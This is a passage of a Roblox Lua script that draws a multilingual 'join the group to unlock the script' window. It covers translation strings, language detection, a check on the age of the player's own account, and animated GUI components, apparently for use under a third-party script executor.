		s3 = "\u{30b0}\u{30eb}\u{30fc}\u{30d7}\u{30da}\u{30fc}\u{30b8}\u{3067}\u{300c}\u{53c2}\u{52a0}\u{300d}\u{3092}\u{62bc}\u{305b}\u{3070}\u{5b8c}\u{4e86}\u{ff01}",
		join_btn = "\u{30b0}\u{30eb}\u{30fc}\u{30d7}\u{306b}\u{53c2}\u{52a0}",
		link_copied = "\u{30ea}\u{30f3}\u{30af}\u{3092}\u{30b3}\u{30d4}\u{30fc}\u{3057}\u{307e}\u{3057}\u{305f}\u{3002}\u{30d6}\u{30e9}\u{30a6}\u{30b6}\u{306b}\u{8cbc}\u{308a}\u{4ed8}\u{3051}\u{3066}\u{304f}\u{3060}\u{3055}\u{3044}\u{3002}",
		copy_failed = "\u{30b3}\u{30d4}\u{30fc}\u{3067}\u{304d}\u{307e}\u{305b}\u{3093}\u{3067}\u{3057}\u{305f}\u{3002}Roblox \u{3067}\u{300c}%s\u{300d}\u{3092}\u{691c}\u{7d22}\u{3057}\u{3066}\u{53c2}\u{52a0}\u{3057}\u{3066}\u{304f}\u{3060}\u{3055}\u{3044}\u{3002}",
		tab_join = "\u{89e3}\u{9664}",
		tab_lang = "\u{8a00}\u{8a9e}",
		lang_sub = "\u{8a00}\u{8a9e}\u{3092}\u{9078}\u{629e}",
		kick_msg = "\u{30a2}\u{30ab}\u{30a6}\u{30f3}\u{30c8}\u{304c}\u{65b0}\u{3057}\u{3059}\u{304e}\u{307e}\u{3059}\u{3002}\u{4f5c}\u{6210}\u{304b}\u{3089}%s\u{65e5}\u{5f8c}\u{306b}\u{307e}\u{305f}\u{304a}\u{8d8a}\u{3057}\u{304f}\u{3060}\u{3055}\u{3044}\u{3002}",
		already = "\u{3059}\u{3067}\u{306b}\u{30b0}\u{30eb}\u{30fc}\u{30d7}\u{306b}\u{53c2}\u{52a0}\u{3057}\u{3066}\u{3044}\u{307e}\u{3059}\u{3002}\u{3042}\u{308a}\u{304c}\u{3068}\u{3046}\u{ff01}",
	},
	zh = {
		join_title = "\u{89e3}\u{9501}\u{811a}\u{672c}",
		join_sub = "\u{8981}\u{89e3}\u{9501}\u{811a}\u{672c}\u{ff0c}\u{4f60}\u{9700}\u{8981}\u{52a0}\u{5165}\u{7fa4}\u{7ec4}\u{3002}",
		s1 = "\u{70b9}\u{51fb}\u{201c}\u{52a0}\u{5165}\u{7fa4}\u{7ec4}\u{201d}\u{ff0c}\u{94fe}\u{63a5}\u{4f1a}\u{88ab}\u{590d}\u{5236}\u{3002}",
		s2 = "\u{6253}\u{5f00}\u{6d4f}\u{89c8}\u{5668}\u{5e76}\u{7c98}\u{8d34}\u{94fe}\u{63a5}\u{3002}",
		s3 = "\u{5728}\u{7fa4}\u{7ec4}\u{9875}\u{9762}\u{70b9}\u{51fb}\u{201c}\u{52a0}\u{5165}\u{201d}\u{ff0c}\u{5b8c}\u{6210}\u{ff01}",
		join_btn = "\u{52a0}\u{5165}\u{7fa4}\u{7ec4}",
		link_copied = "\u{94fe}\u{63a5}\u{5df2}\u{590d}\u{5236}\u{ff0c}\u{8bf7}\u{7c98}\u{8d34}\u{5230}\u{6d4f}\u{89c8}\u{5668}\u{4e2d}\u{3002}",
		copy_failed = "\u{590d}\u{5236}\u{5931}\u{8d25}\u{3002}\u{8bf7}\u{5728} Roblox \u{641c}\u{7d22}\u{201c}%s\u{201d}\u{5e76}\u{52a0}\u{5165}\u{3002}",
		tab_join = "\u{89e3}\u{9501}",
		tab_lang = "\u{8bed}\u{8a00}",
		lang_sub = "\u{9009}\u{62e9}\u{4f60}\u{7684}\u{8bed}\u{8a00}",
		kick_msg = "\u{8d26}\u{53f7}\u{592a}\u{65b0}\u{3002}\u{8d26}\u{53f7}\u{6ee1} %s \u{5929}\u{540e}\u{518d}\u{6765}\u{5427}\u{3002}",
		already = "\u{4f60}\u{5df2}\u{7ecf}\u{5728}\u{7fa4}\u{7ec4}\u{91cc}\u{4e86}\u{ff0c}\u{8c22}\u{8c22}\u{ff01}",
	},
	zht = {
		join_title = "\u{89e3}\u{9396}\u{8173}\u{672c}",
		join_sub = "\u{8981}\u{89e3}\u{9396}\u{8173}\u{672c}\u{ff0c}\u{4f60}\u{9700}\u{8981}\u{52a0}\u{5165}\u{7fa4}\u{7d44}\u{3002}",
		s1 = "\u{9ede}\u{64ca}\u{300c}\u{52a0}\u{5165}\u{7fa4}\u{7d44}\u{300d}\u{ff0c}\u{9023}\u{7d50}\u{6703}\u{88ab}\u{8907}\u{88fd}\u{3002}",
		s2 = "\u{958b}\u{555f}\u{700f}\u{89bd}\u{5668}\u{4e26}\u{8cbc}\u{4e0a}\u{9023}\u{7d50}\u{3002}",
		s3 = "\u{5728}\u{7fa4}\u{7d44}\u{9801}\u{9762}\u{9ede}\u{64ca}\u{300c}\u{52a0}\u{5165}\u{300d}\u{ff0c}\u{5b8c}\u{6210}\u{ff01}",
		join_btn = "\u{52a0}\u{5165}\u{7fa4}\u{7d44}",
		link_copied = "\u{9023}\u{7d50}\u{5df2}\u{8907}\u{88fd}\u{ff0c}\u{8acb}\u{8cbc}\u{5230}\u{700f}\u{89bd}\u{5668}\u{4e2d}\u{3002}",
		copy_failed = "\u{8907}\u{88fd}\u{5931}\u{6557}\u{3002}\u{8acb}\u{5728} Roblox \u{641c}\u{5c0b}\u{300c}%s\u{300d}\u{4e26}\u{52a0}\u{5165}\u{3002}",
		tab_join = "\u{89e3}\u{9396}",
		tab_lang = "\u{8a9e}\u{8a00}",
		lang_sub = "\u{9078}\u{64c7}\u{4f60}\u{7684}\u{8a9e}\u{8a00}",
		kick_msg = "\u{5e33}\u{865f}\u{592a}\u{65b0}\u{3002}\u{5e33}\u{865f}\u{6eff} %s \u{5929}\u{5f8c}\u{518d}\u{4f86}\u{5427}\u{3002}",
		already = "\u{4f60}\u{5df2}\u{7d93}\u{5728}\u{7fa4}\u{7d44}\u{88e1}\u{4e86}\u{ff0c}\u{8b1d}\u{8b1d}\u{ff01}",
	},
	nl = {
		join_title = "Ontgrendel het script",
		join_sub = "Om het script te ontgrendelen moet je lid worden van de groep.",
		s1 = "Tik op Groep joinen. De link wordt gekopieerd.",
		s2 = "Open je browser en plak hem erin.",
		s3 = "Tik op de groepspagina op Joinen. Klaar!",
		join_btn = "Groep joinen",
		link_copied = "Link gekopieerd. Plak hem in je browser.",
		copy_failed = "Kopi\u{eb}ren mislukt. Zoek \u{201c}%s\u{201d} op Roblox en word lid.",
		tab_join = "Ontgrendel",
		tab_lang = "Taal",
		lang_sub = "Kies je taal",
		kick_msg = "Account te nieuw. Kom terug als het %s dagen oud is.",
		already = "Je zit al in de groep. Bedankt!",
	},
	uk = {
		join_title = "\u{420}\u{43e}\u{437}\u{431}\u{43b}\u{43e}\u{43a}\u{443}\u{439} \u{441}\u{43a}\u{440}\u{438}\u{43f}\u{442}",
		join_sub = "\u{429}\u{43e}\u{431} \u{440}\u{43e}\u{437}\u{431}\u{43b}\u{43e}\u{43a}\u{443}\u{432}\u{430}\u{442}\u{438} \u{441}\u{43a}\u{440}\u{438}\u{43f}\u{442}, \u{43f}\u{43e}\u{442}\u{440}\u{456}\u{431}\u{43d}\u{43e} \u{43f}\u{440}\u{438}\u{454}\u{434}\u{43d}\u{430}\u{442}\u{438}\u{441}\u{44f} \u{434}\u{43e} \u{433}\u{440}\u{443}\u{43f}\u{438}.",
		s1 = "\u{41d}\u{430}\u{442}\u{438}\u{441}\u{43d}\u{438} \u{ab}\u{41f}\u{440}\u{438}\u{454}\u{434}\u{43d}\u{430}\u{442}\u{438}\u{441}\u{44f} \u{434}\u{43e} \u{433}\u{440}\u{443}\u{43f}\u{438}\u{bb}. \u{41f}\u{43e}\u{441}\u{438}\u{43b}\u{430}\u{43d}\u{43d}\u{44f} \u{441}\u{43a}\u{43e}\u{43f}\u{456}\u{44e}\u{454}\u{442}\u{44c}\u{441}\u{44f}.",
		s2 = "\u{412}\u{456}\u{434}\u{43a}\u{440}\u{438}\u{439} \u{431}\u{440}\u{430}\u{443}\u{437}\u{435}\u{440} \u{456} \u{432}\u{441}\u{442}\u{430}\u{432} \u{439}\u{43e}\u{433}\u{43e}.",
		s3 = "\u{41d}\u{430}\u{442}\u{438}\u{441}\u{43d}\u{438} \u{ab}\u{41f}\u{440}\u{438}\u{454}\u{434}\u{43d}\u{430}\u{442}\u{438}\u{441}\u{44f}\u{bb} \u{43d}\u{430} \u{441}\u{442}\u{43e}\u{440}\u{456}\u{43d}\u{446}\u{456} \u{433}\u{440}\u{443}\u{43f}\u{438}. \u{413}\u{43e}\u{442}\u{43e}\u{432}\u{43e}!",
		join_btn = "\u{41f}\u{440}\u{438}\u{454}\u{434}\u{43d}\u{430}\u{442}\u{438}\u{441}\u{44f} \u{434}\u{43e} \u{433}\u{440}\u{443}\u{43f}\u{438}",
		link_copied = "\u{41f}\u{43e}\u{441}\u{438}\u{43b}\u{430}\u{43d}\u{43d}\u{44f} \u{441}\u{43a}\u{43e}\u{43f}\u{456}\u{439}\u{43e}\u{432}\u{430}\u{43d}\u{43e}. \u{412}\u{441}\u{442}\u{430}\u{432} \u{439}\u{43e}\u{433}\u{43e} \u{432} \u{431}\u{440}\u{430}\u{443}\u{437}\u{435}\u{440}.",
		copy_failed = "\u{41d}\u{435} \u{432}\u{434}\u{430}\u{43b}\u{43e}\u{441}\u{44f} \u{441}\u{43a}\u{43e}\u{43f}\u{456}\u{44e}\u{432}\u{430}\u{442}\u{438}. \u{417}\u{43d}\u{430}\u{439}\u{434}\u{438} \u{ab}%s\u{bb} \u{443} Roblox \u{456} \u{43f}\u{440}\u{438}\u{454}\u{434}\u{43d}\u{430}\u{439}\u{441}\u{44f}.",
		tab_join = "\u{420}\u{43e}\u{437}\u{431}\u{43b}\u{43e}\u{43a}\u{443}\u{439}",
		tab_lang = "\u{41c}\u{43e}\u{432}\u{430}",
		lang_sub = "\u{41e}\u{431}\u{435}\u{440}\u{438} \u{43c}\u{43e}\u{432}\u{443}",
		kick_msg = "\u{410}\u{43a}\u{430}\u{443}\u{43d}\u{442} \u{43d}\u{430}\u{434}\u{442}\u{43e} \u{43d}\u{43e}\u{432}\u{438}\u{439}. \u{41f}\u{43e}\u{432}\u{435}\u{440}\u{43d}\u{438}\u{441}\u{44c}, \u{43a}\u{43e}\u{43b}\u{438} \u{439}\u{43e}\u{43c}\u{443} \u{431}\u{443}\u{434}\u{435} %s \u{434}\u{43d}.",
		already = "\u{422}\u{438} \u{432}\u{436}\u{435} \u{432} \u{433}\u{440}\u{443}\u{43f}\u{456}. \u{414}\u{44f}\u{43a}\u{443}\u{454}\u{43c}\u{43e}!",
	},
	ro = {
		join_title = "Deblocheaz\u{103} scriptul",
		join_sub = "Pentru a debloca scriptul, trebuie s\u{103} te al\u{103}turi grupului.",
		s1 = "Apas\u{103} Al\u{103}tur\u{103}-te grupului. Linkul se copiaz\u{103}.",
		s2 = "Deschide browserul \u{219}i lipe\u{219}te-l.",
		s3 = "Apas\u{103} Al\u{103}tur\u{103}-te pe pagina grupului. Gata!",
		join_btn = "Al\u{103}tur\u{103}-te grupului",
		link_copied = "Link copiat. Lipe\u{219}te-l \u{ee}n browser.",
		copy_failed = "Nu s-a putut copia. Caut\u{103} \u{201e}%s\u{201d} pe Roblox \u{219}i al\u{103}tur\u{103}-te.",
		tab_join = "Deblocheaz\u{103}",
		tab_lang = "Limb\u{103}",
		lang_sub = "Alege limba",
		kick_msg = "Cont prea nou. Revino c\u{e2}nd are %s zile.",
		already = "E\u{219}ti deja \u{ee}n grup. Mul\u{21b}umim!",
	},
	hi = {
		join_title = "\u{938}\u{94d}\u{915}\u{94d}\u{930}\u{93f}\u{92a}\u{94d}\u{91f} \u{905}\u{928}\u{932}\u{949}\u{915} \u{915}\u{930}\u{947}\u{902}",
		join_sub = "\u{938}\u{94d}\u{915}\u{94d}\u{930}\u{93f}\u{92a}\u{94d}\u{91f} \u{905}\u{928}\u{932}\u{949}\u{915} \u{915}\u{930}\u{928}\u{947} \u{915}\u{947} \u{932}\u{93f}\u{90f} \u{906}\u{92a}\u{915}\u{94b} \u{917}\u{94d}\u{930}\u{941}\u{92a} \u{91c}\u{949}\u{907}\u{928} \u{915}\u{930}\u{928}\u{93e} \u{939}\u{94b}\u{917}\u{93e}\u{964}",
		s1 = "\u{917}\u{94d}\u{930}\u{941}\u{92a} \u{91c}\u{949}\u{907}\u{928} \u{915}\u{930}\u{947}\u{902} \u{926}\u{92c}\u{93e}\u{90f}\u{901}\u{964} \u{932}\u{93f}\u{902}\u{915} \u{915}\u{949}\u{92a}\u{940} \u{939}\u{94b} \u{91c}\u{93e}\u{90f}\u{917}\u{93e}\u{964}",
		s2 = "\u{92c}\u{94d}\u{930}\u{93e}\u{909}\u{91c}\u{93c}\u{930} \u{916}\u{94b}\u{932}\u{947}\u{902} \u{914}\u{930} \u{909}\u{938}\u{947} \u{92a}\u{947}\u{938}\u{94d}\u{91f} \u{915}\u{930}\u{947}\u{902}\u{964}",
		s3 = "\u{917}\u{94d}\u{930}\u{941}\u{92a} \u{92a}\u{947}\u{91c} \u{92a}\u{930} \u{91c}\u{949}\u{907}\u{928} \u{926}\u{92c}\u{93e}\u{90f}\u{901}\u{964} \u{939}\u{94b} \u{917}\u{92f}\u{93e}!",
		join_btn = "\u{917}\u{94d}\u{930}\u{941}\u{92a} \u{91c}\u{949}\u{907}\u{928} \u{915}\u{930}\u{947}\u{902}",
		link_copied = "\u{932}\u{93f}\u{902}\u{915} \u{915}\u{949}\u{92a}\u{940} \u{939}\u{94b} \u{917}\u{92f}\u{93e}\u{964} \u{92c}\u{94d}\u{930}\u{93e}\u{909}\u{91c}\u{93c}\u{930} \u{92e}\u{947}\u{902} \u{92a}\u{947}\u{938}\u{94d}\u{91f} \u{915}\u{930}\u{947}\u{902}\u{964}",
		copy_failed = "\u{915}\u{949}\u{92a}\u{940} \u{928}\u{939}\u{940}\u{902} \u{939}\u{94b} \u{938}\u{915}\u{93e}\u{964} Roblox \u{92a}\u{930} \u{201c}%s\u{201d} \u{916}\u{94b}\u{91c}\u{947}\u{902} \u{914}\u{930} \u{91c}\u{941}\u{921}\u{93c}\u{947}\u{902}\u{964}",
		tab_join = "\u{905}\u{928}\u{932}\u{949}\u{915}",
		tab_lang = "\u{92d}\u{93e}\u{937}\u{93e}",
		lang_sub = "\u{905}\u{92a}\u{928}\u{940} \u{92d}\u{93e}\u{937}\u{93e} \u{91a}\u{941}\u{928}\u{947}\u{902}",
		kick_msg = "\u{905}\u{915}\u{93e}\u{909}\u{902}\u{91f} \u{92c}\u{939}\u{941}\u{924} \u{928}\u{92f}\u{93e} \u{939}\u{948}\u{964} \u{905}\u{915}\u{93e}\u{909}\u{902}\u{91f} %s \u{926}\u{93f}\u{928} \u{915}\u{93e} \u{939}\u{94b}\u{928}\u{947} \u{92a}\u{930} \u{935}\u{93e}\u{92a}\u{938} \u{906}\u{90f}\u{901}\u{964}",
		already = "\u{906}\u{92a} \u{92a}\u{939}\u{932}\u{947} \u{938}\u{947} \u{917}\u{94d}\u{930}\u{941}\u{92a} \u{92e}\u{947}\u{902} \u{939}\u{948}\u{902}\u{964} \u{927}\u{928}\u{94d}\u{92f}\u{935}\u{93e}\u{926}!",
	},
	ms = {
		join_title = "Buka kunci skrip",
		join_sub = "Untuk membuka kunci skrip, anda perlu menyertai kumpulan.",
		s1 = "Tekan Sertai Kumpulan. Pautan akan disalin.",
		s2 = "Buka pelayar dan tampal pautan itu.",
		s3 = "Tekan Sertai di halaman kumpulan. Siap!",
		join_btn = "Sertai Kumpulan",
		link_copied = "Pautan disalin. Tampal di pelayar.",
		copy_failed = "Gagal menyalin. Cari \u{201c}%s\u{201d} di Roblox dan sertai.",
		tab_join = "Buka kunci",
		tab_lang = "Bahasa",
		lang_sub = "Pilih bahasa anda",
		kick_msg = "Akaun terlalu baharu. Datang semula apabila akaun berusia %s hari.",
		already = "Anda sudah dalam kumpulan. Terima kasih!",
	},
}

-- Roblox tells us the player's language (e.g. "pt-br"), so we can preselect it
local function detectLanguage()
	-- ask Roblox for the player's language in a few ways (some executors block one of them) and take the first non-English hit
	local sources = {
		function() return LocalPlayer.LocaleId end,
		function() return LocalizationService.RobloxLocaleId end,
		function() return LocalizationService.SystemLocaleId end,
	}
	for _, get in ipairs(sources) do
		local ok, id = pcall(get)
		if ok and type(id) == "string" and id ~= "" then
			local lid = id:lower()
			local code = lid:match("^(%a+)")
			if code == "zh" and (lid:find("tw") or lid:find("hk") or lid:find("hant")) then code = "zht" end
			if code and code ~= "en" and STR[code] then return code end
		end
	end
	return "en"
end

local lang = detectLanguage() -- only used to preselect; the player is asked every time

local function tr(key, ...)
	local str = (STR[lang] and STR[lang][key]) or STR.en[key] or key
	if select("#", ...) > 0 then return string.format(str, ...) end
	return str
end

---------------- alt / new account gate ----------------
-- This script runs on the player's own client, so it can only remove the account that is running it
-- (it cannot kick other players). Account age is the signal: alts are almost always brand new.
if MIN_ACCOUNT_AGE_DAYS > 0 and LocalPlayer.AccountAge < MIN_ACCOUNT_AGE_DAYS then
	local msg = tr("kick_msg", MIN_ACCOUNT_AGE_DAYS)
	if KICK_NEW_ACCOUNTS then
		pcall(function() LocalPlayer:Kick("[" .. NAME .. "] " .. msg) end)
	else
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", { Title = NAME, Text = msg, Duration = 8 })
		end)
	end
	return
end

---------------- gui root ----------------
local function getContainer()
	if gethui then
		local ok, ui = pcall(gethui)
		if ok and ui then return ui end
	end
	local ok, core = pcall(function() return game:GetService("CoreGui") end)
	if ok and core then return core end
	return LocalPlayer:WaitForChild("PlayerGui")
end

local container = getContainer()
pcall(function()
	for _, old in ipairs(container:GetChildren()) do
		if old.Name == "LumenGroupGate" then old:Destroy() end
	end
	for _, old in ipairs(Lighting:GetChildren()) do
		if old.Name == "LumenBlur" then old:Destroy() end
	end
end)

local gui = make("ScreenGui", {
	Name = "LumenGroupGate", ResetOnSpawn = false, DisplayOrder = 100, IgnoreGuiInset = true,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
})
if not pcall(function() gui.Parent = container end) then
	gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end

local conns = {}

-- shrink the window on small screens
local function computeFit()
	local v = gui.AbsoluteSize
	if v.X < 50 or v.Y < 50 then return 1 end
	return math.clamp(math.min(v.X / (W + 32), v.Y / (H + 48)), 0.45, 1)
end
local fit = computeFit()

-- drag with screen clamping; margin() = how far the center must stay from the screen edges
local function draggable(handle, target, margin)
	local dragging, dragStart, origin, moved = false, nil, nil, false
	handle.InputBegan:Connect(function(input)
		local t = input.UserInputType
		if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
			dragging, moved, dragStart, origin = true, false, input.Position, target.Position
		end
	end)
	table.insert(conns, UserInputService.InputChanged:Connect(function(input)
		local t = input.UserInputType
		if dragging and (t == Enum.UserInputType.MouseMovement or t == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			if delta.Magnitude > 6 then moved = true end
			local v = gui.AbsoluteSize
			local mx, my = margin()
			mx, my = math.min(mx, v.X / 2), math.min(my, v.Y / 2)
			target.Position = UDim2.fromOffset(
				math.clamp(origin.X.Scale * v.X + origin.X.Offset + delta.X, mx, v.X - mx),
				math.clamp(origin.Y.Scale * v.Y + origin.Y.Offset + delta.Y, my, v.Y - my)
			)
		end
	end))
	table.insert(conns, UserInputService.InputEnded:Connect(function(input)
		local t = input.UserInputType
		if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then dragging = false end
	end))
	return function() return moved end
end

---------------- logo ----------------
-- gradient squircle with an "L" and a spark. Everything scales from `size`.
local function makeLogo(parent, size, position)
	local u = size / 10
	local icon = make("Frame", {
		Size = UDim2.fromOffset(size, size), Position = position,
		BackgroundColor3 = C.white, BorderSizePixel = 0,
	}, parent)
	round(icon, u * 3)
	local k = ColorSequenceKeypoint.new
	spin(make("UIGradient", { Color = ColorSequence.new({ k(0, C.accent), k(0.5, C.accent2), k(1, C.accent) }) }, icon), 8)
	stroke(icon, C.white, 1, 0.82)

	local gloss = make("Frame", {
		Size = UDim2.new(1, -2, 0.5, 0), Position = UDim2.fromOffset(1, 1),
		BackgroundColor3 = C.white, BorderSizePixel = 0,
	}, icon)
	round(gloss, u * 3 - 1)
	make("UIGradient", {
		Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0.72), NumberSequenceKeypoint.new(1, 1) }),
		Rotation = 90,
	}, gloss)

	local bar, tall, foot = u * 1.5, u * 4.6, u * 3.6
	local x0, y0 = u * 3, u * 2.4
	local function piece(w, h, x, y, r)
		local f = make("Frame", {
			Size = UDim2.fromOffset(w, h), Position = UDim2.fromOffset(x, y),
			BackgroundColor3 = C.white, BorderSizePixel = 0,
		}, icon)
		round(f, r)
	end
	piece(bar, tall, x0, y0, bar / 2)                                     -- stem
	piece(foot, bar, x0, y0 + tall - bar, bar / 2)                        -- foot
	piece(u * 1.3, u * 1.3, u * 6.2, y0 + tall - bar - u * 2.2, u * 1.3)  -- spark
end

---------------- window + soft shadow ----------------
local root = make("Frame", {
	Size = UDim2.fromOffset(W, H), Position = UDim2.fromScale(0.5, 0.5),
	AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, BorderSizePixel = 0,
}, gui)
local rootScale = make("UIScale", { Scale = fit * 0.94 }, root)

-- stacked rounded layers = a soft shadow that always matches the corner radius (no image needed)
local shadowLayers = {}
for i = 1, 8 do
	local grow = i * 7
	local layer = make("Frame", {
		AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 10),
		Size = UDim2.new(1, grow, 1, grow), BackgroundColor3 = Color3.new(0, 0, 0),
		BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 0,
	}, root)
	round(layer, CORNER + grow / 2)
	shadowLayers[i] = layer
end
local function setShadow(visible, t)
	for _, layer in ipairs(shadowLayers) do
		tween(layer, t, { BackgroundTransparency = visible and 0.955 or 1 })
	end
end

local window = make("CanvasGroup", {
	Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.bg, BackgroundTransparency = 0.08, BorderSizePixel = 0,
	GroupTransparency = 1, ZIndex = 1,
}, root)
round(window, CORNER)
-- (a stroke on a CanvasGroup ignores GroupTransparency, so it's faded on its own)
local windowStroke = stroke(window, C.white, 1.5, 1)
spin(make("UIGradient", { Color = sweep(Color3.fromRGB(40, 40, 54), C.accent) }, windowStroke), 6)

-- ambient glows
local function glow(color, height, atBottom, from, to)
	local f = make("Frame", {
		Size = UDim2.new(1, 0, 0, height), BackgroundColor3 = color, BorderSizePixel = 0,
		AnchorPoint = Vector2.new(0, atBottom and 1 or 0),
		Position = UDim2.fromScale(0, atBottom and 1 or 0),
	}, window)
	make("UIGradient", {
		Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, from), NumberSequenceKeypoint.new(1, to) }),
		Rotation = 90,
	}, f)
end
glow(C.accent, 130, false, 0.84, 1)
glow(C.accent2, 110, true, 1, 0.9)

---------------- header (title bar) ----------------
local header = make("Frame", { Size = UDim2.new(1, 0, 0, HEADER), BackgroundTransparency = 1 }, window)
makeLogo(header, 26, UDim2.fromOffset(18, 11))
label({
	Size = UDim2.fromOffset(140, 20), Position = UDim2.fromOffset(52, 14), Text = NAME,
	TextColor3 = C.text, Font = Enum.Font.GothamBold, TextSize = 15, TextXAlignment = Enum.TextXAlignment.Left,
}, header)

local function headerButton(offsetX, caption, size)
	local btn = make("TextButton", {
		Size = UDim2.fromOffset(34, 34), Position = UDim2.new(1, offsetX, 0, 7),
		BackgroundColor3 = C.surface, BackgroundTransparency = 1, Text = caption, TextColor3 = C.muted,
		Font = Enum.Font.GothamBold, TextSize = size, AutoButtonColor = false, BorderSizePixel = 0,
	}, header)
	round(btn, 9)
	bind(btn,
		function() tween(btn, 0.12, { BackgroundTransparency = 0, TextColor3 = C.text }) end,
		function() tween(btn, 0.12, { BackgroundTransparency = 1, TextColor3 = C.muted }) end)
	return btn
end
local minBtn = headerButton(-46, "\u{2013}", 18)

make("Frame", { -- line under the title bar
	Size = UDim2.new(1, 0, 0, 1), Position = UDim2.fromOffset(0, HEADER - 1),
	BackgroundColor3 = C.stroke, BackgroundTransparency = 0.4, BorderSizePixel = 0,
}, window)
make("Frame", { -- line between the sidebar and the pages
	Size = UDim2.new(0, 1, 1, -HEADER), Position = UDim2.fromOffset(SIDEBAR, HEADER),
	BackgroundColor3 = C.stroke, BackgroundTransparency = 0.4, BorderSizePixel = 0,
}, window)

draggable(header, root, function() return W * fit / 2, H * fit / 2 end)

---------------- button ----------------
-- returns the clickable area and its label
local function makeButton(parent, position, size, primary, caption, textSize)
	local hit = make("TextButton", {
		Position = position, Size = size, BackgroundTransparency = 1, Text = "",
		AutoButtonColor = false, BorderSizePixel = 0,
	}, parent)
	local fill = make("Frame", {
		Size = UDim2.fromScale(1, 1), BorderSizePixel = 0,
		BackgroundColor3 = primary and C.white or C.surface,
	}, hit)
	round(fill, 12)
	local edge = stroke(fill, primary and C.white or C.stroke, 1, primary and 0.8 or 0)
	if primary then
		make("UIGradient", { Color = ColorSequence.new(C.accent, C.accent2), Rotation = 20 }, fill)
	end
	local lbl = label({
		Size = UDim2.fromScale(1, 1), Text = caption, TextColor3 = primary and C.white or C.text,
		Font = Enum.Font.GothamBold, TextSize = textSize or 14, ZIndex = 2,
	}, hit)
	local scale = make("UIScale", {}, hit)

	bind(hit,
		function()
			tween(scale, 0.12, { Scale = 1.03 })
			if primary then tween(edge, 0.12, { Transparency = 0.5 })
			else
				tween(fill, 0.12, { BackgroundColor3 = C.surfaceHover })
				tween(edge, 0.12, { Color = C.strokeHover })
			end
		end,
		function()
			tween(scale, 0.12, { Scale = 1 })
			if primary then tween(edge, 0.12, { Transparency = 0.8 })
			else
				tween(fill, 0.12, { BackgroundColor3 = C.surface })
				tween(edge, 0.12, { Color = C.stroke })
			end
		end,
		function() tween(scale, 0.05, { Scale = 0.96 }) end,
		function() tween(scale, 0.12, { Scale = 1.03 }) end)
	return hit, lbl
end

---------------- sidebar tabs + pages ----------------
local pages, current, pageToken = {}, nil, 0
local tabs = {}
local showPage -- defined below

local function makeTab(index, key)
	local btn = make("TextButton", {
		Size = UDim2.fromOffset(SIDEBAR - 24, 38), Position = UDim2.fromOffset(12, HEADER + 14 + (index - 1) * 44),
		BackgroundColor3 = C.surfaceHover, BackgroundTransparency = 1, Text = "", AutoButtonColor = false, BorderSizePixel = 0,
	}, window)
	round(btn, 10)
	local bar = make("Frame", {
		Size = UDim2.fromOffset(3, 16), Position = UDim2.new(0, 8, 0.5, -8),
		BackgroundColor3 = C.accent2, BackgroundTransparency = 1, BorderSizePixel = 0,
	}, btn)
	round(bar, 2)
	local lbl = label({
		Size = UDim2.new(1, -30, 1, 0), Position = UDim2.fromOffset(22, 0), TextColor3 = C.muted,
		Font = Enum.Font.GothamMedium, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
	}, btn)
	tabs[key] = { btn = btn, bar = bar, lbl = lbl }
	bind(btn,
		function() if current ~= key then tween(btn, 0.12, { BackgroundTransparency = 0.6 }) end end,
		function() if current ~= key then tween(btn, 0.12, { BackgroundTransparency = 1 }) end end)
	btn.MouseButton1Click:Connect(function() showPage(key) end)
end
makeTab(1, "join")
makeTab(2, "lang")

local function setTabActive(name)
	for key, t in pairs(tabs) do
		local on = key == name
		tween(t.bar, 0.15, { BackgroundTransparency = on and 0 or 1 })
		tween(t.lbl, 0.15, { TextColor3 = on and C.text or C.muted })
		tween(t.btn, 0.15, { BackgroundTransparency = on and 0.35 or 1 })
	end
end

local function newPage(name)
	pages[name] = make("CanvasGroup", {
		Size = UDim2.fromOffset(PAGE_W, PAGE_H), Position = UDim2.fromOffset(SIDEBAR, HEADER),
		BackgroundTransparency = 1, BorderSizePixel = 0, Visible = false, GroupTransparency = 1,
	}, window)
	return pages[name]
end

showPage = function(name)
	if name == current then return end
	pageToken += 1
	local token = pageToken
	local old, new = pages[current], pages[name]
	current = name
	setTabActive(name)
	if old then
		tween(old, 0.1, { GroupTransparency = 1, Position = UDim2.fromOffset(SIDEBAR - 10, HEADER) })
		task.delay(0.1, function()
			if pages[current] ~= old then old.Visible = false end
		end)
	end
	task.delay(old and 0.04 or 0, function()
		if token ~= pageToken then return end
		new.Position = UDim2.fromOffset(SIDEBAR + 10, HEADER)
		new.GroupTransparency = 1
		new.Visible = true
		tween(new, 0.22, { GroupTransparency = 0, Position = UDim2.fromOffset(SIDEBAR, HEADER) })
	end)
end

---------------- pop-up ("link copied") ----------------
-- bottom right on PC; top center on phones/tablets so it never covers the on-screen controls
local onTouch = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
local TOAST_HIDDEN = onTouch and UDim2.new(0.5, 0, 0, -90) or UDim2.new(1, 320, 1, -20)
local TOAST_SHOWN = onTouch and UDim2.new(0.5, 0, 0, 14) or UDim2.new(1, -20, 1, -20)
local toast = make("Frame", {
	Size = UDim2.fromOffset(280, 64), AnchorPoint = onTouch and Vector2.new(0.5, 0) or Vector2.new(1, 1),
	Position = TOAST_HIDDEN, BackgroundColor3 = C.surface, BorderSizePixel = 0, ZIndex = 50,
}, gui)
round(toast, 12)
local toastStroke = stroke(toast, C.success, 1, 0.5)
label({
	Size = UDim2.new(1, -44, 0, 16), Position = UDim2.fromOffset(14, 10), Text = NAME, TextColor3 = C.muted,
	Font = Enum.Font.GothamMedium, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 51,
}, toast)
local toastMsg = fitLabel({
	Size = UDim2.new(1, -44, 0, 26), Position = UDim2.fromOffset(14, 28), TextColor3 = C.text,
